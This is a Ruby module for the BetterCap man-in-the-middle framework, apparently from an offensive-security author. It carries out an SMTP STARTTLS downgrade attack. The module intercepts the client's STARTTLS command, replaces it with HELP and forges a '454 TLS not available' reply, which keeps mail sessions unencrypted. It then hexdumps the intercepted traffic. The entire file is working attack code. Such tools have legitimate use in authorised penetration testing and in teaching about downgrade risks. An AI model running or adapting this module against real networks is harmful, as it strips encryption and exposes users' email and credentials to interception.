=begin
Author  : @mgeeky
Email   : mb@binary-offensive.com
This project is released under the GPL 3 license.
=end

class SMTPDowngrade < BetterCap::Proxy::TCP::Module
    meta(
        'Name'          => 'SMTPDowngrade',
        'Description'   => 'Downgrades SMTP encryption by returning deny to STARTTLS request.',
        'Version'       => '1.0.0',
        'Author'        => 'mgeeky - mb@binary-offensive.com - https://github.com/mgeeky',
        'License'       => 'GPL3'
    )

    def on_response(event)
        if @respondwith != nil
            BetterCap::Logger.info "[#{'SMTP Downgrade'.green}] Lying that SMTP server does not support SSL/TLS."
            event.data = @respondwith
            @respondwith = nil
        end

        BetterCap::Logger.raw "\n#{BetterCap::StreamLogger.hexdump( event.data )}\n"
    end

    def on_data(event)
        @respondwith = smtp_parse_request(event)
    end

    def smtp_parse_request(event)
        return nil if not event.data

        if event.data =~ /^STARTTLS.*/
            BetterCap::Logger.info "[#{'SMTP Downgrade'.green}] Intercepted STARTTLS command."
            @respondwith = "454 4.7.0 TLS not available due to local problem\r\n"

            event.data = "HELP\r\n"
        end

        BetterCap::Logger.raw "\n#{BetterCap::StreamLogger.hexdump( event.data )}\n"
    end
end
